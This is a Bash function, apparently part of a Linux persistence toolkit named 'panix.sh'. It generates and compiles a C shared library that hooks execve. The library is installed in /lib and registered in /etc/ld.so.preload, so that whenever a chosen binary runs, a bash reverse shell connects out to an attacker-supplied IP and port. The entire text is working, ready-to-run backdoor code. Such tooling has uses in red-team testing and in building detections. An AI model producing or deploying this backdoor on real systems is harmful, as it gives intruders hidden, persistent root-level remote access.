setup_ld_preload_backdoor() {
    local ip=""
    local port=""
    local binary=""
    local preload_compile_dir="/tmp/preload"
    local preload_name="preload_backdoor"
    local preload_source="${preload_compile_dir}/${preload_name}.c"
    local preload_lib="/lib/${preload_name}.so"
    local preload_file="/etc/ld.so.preload"

    # Ensure the function is executed as root
    if [[ $UID -ne 0 ]]; then
        echo "Error: This function can only be run as root."
        exit 1
    fi

    usage_ld_preload_backdoor() {
        echo "Usage: ./panix.sh --ld-preload [OPTIONS]"
        echo "--examples                   Display command examples"
        echo "--ip <ip>                    Specify IP address for reverse shell"
        echo "--port <port>                Specify port for reverse shell"
        echo "--binary <binary>            Specify binary to monitor"
        echo "--help|-h                    Show this help message"
    }

    while [[ "$1" != "" ]]; do
        case $1 in
            --ip )
                shift
                ip=$1
                ;;
            --port )
                shift
                port=$1
                ;;
            --binary )
                shift
                binary=$1
                ;;
            --examples )
                echo "Examples:"
                echo "./panix.sh --ld-preload --ip 192.168.211.131 --port 4444 --binary /usr/bin/whoami"
                exit 0
                ;;
            --help|-h )
                usage_ld_preload_backdoor
                exit 0
                ;;
            * )
                echo "Invalid option for --ld-preload: $1"
                echo "Try './panix.sh --ld-preload --help' for more information."
                exit 1
        esac
        shift
    done

    if [[ -z $ip || -z $port || -z $binary ]]; then
        echo "Error: --ip, --port, and --binary must be specified."
        echo "Try './panix.sh --ld-preload --help' for more information."
        exit 1
    fi

    # Ensure GCC is installed
    if ! command -v gcc &>/dev/null; then
        echo "Error: GCC is not installed. Please install it to proceed."
        echo "For Debian/Ubuntu: sudo apt install gcc"
        echo "For Fedora/RHEL/CentOS: sudo dnf install gcc"
        exit 1
    fi

    # Ensure the compile directory exists
    mkdir -p ${preload_compile_dir}

    # Generate the C source code for the LD_PRELOAD backdoor
    cat <<-EOF > ${preload_source}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>

// Reverse shell configuration
#define ATTACKER_IP "$ip"
#define ATTACKER_PORT $port

// Function pointer for the original execve
int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);

// Function to spawn a reverse shell in the background
void spawn_reverse_shell() {
    pid_t pid = fork();
    if (pid == 0) { // Child process
        setsid(); // Start a new session
        char command[256];
        sprintf(command, "/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", ATTACKER_IP, ATTACKER_PORT);
        execl("/bin/bash", "bash", "-c", command, NULL);
        exit(0); // Exit child process if execl fails
    }
}

// Hooked execve function
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    // Load the original execve function
    if (!original_execve) {
        original_execve = dlsym(RTLD_NEXT, "execve");
        if (!original_execve) {
            exit(1);
        }
    }

    // Check if the executed binary matches the specified binary
    if (strstr(pathname, "$binary") != NULL) {
        // Spawn reverse shell in the background
        spawn_reverse_shell();
    }

    // Call the original execve function
    return original_execve(pathname, argv, envp);
}
EOF

    # Check if the source file was created
    if [ ! -f "$preload_source" ]; then
        echo "Failed to create the LD_PRELOAD source code at $preload_source"
        exit 1
    else
        echo "LD_PRELOAD source code created: $preload_source"
    fi

    # Compile the shared object
    gcc -shared -fPIC -o $preload_lib $preload_source -ldl
    if [ $? -ne 0 ]; then
        echo "Compilation failed. Exiting."
        exit 1
    fi

    echo "LD_PRELOAD shared object compiled successfully: $preload_lib"

    # Add to /etc/ld.so.preload for persistence
    if ! grep -q "$preload_lib" "$preload_file" 2>/dev/null; then
        echo $preload_lib >> $preload_file
        echo "[+] Backdoor added to /etc/ld.so.preload for persistence."
    else
        echo "[!] Backdoor already present in /etc/ld.so.preload."
    fi

    echo "[+] Execute the binary $binary to trigger the reverse shell."
}
